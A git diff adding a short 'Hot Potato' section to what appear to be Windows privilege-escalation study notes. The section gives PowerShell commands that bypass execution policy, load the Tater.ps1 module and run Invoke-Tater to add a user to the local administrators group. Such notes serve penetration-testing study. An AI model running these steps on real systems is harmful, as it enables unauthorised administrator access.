@@ -758,6 +758,22 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
     return TRUE;
 }
 ```
+-------------------------
+
+### Hot Potato exploitation for windows 7
+
+![image](https://github.com/user-attachments/assets/25885a6e-ee43-4254-bd61-ca3e95858c89)
+
+- Process-:
+  - `powershell.exe -nop -ep bypass`
+  - Import the `tater.ps1` script `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
+  - Execute a command with the imported module `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
+
+- Check if it worked by running `net localgroup administrators`
+
+![image](https://github.com/user-attachments/assets/4e388732-fed2-4187-9eb1-af7b07b79824)
+
+
 
 -------------------------
 
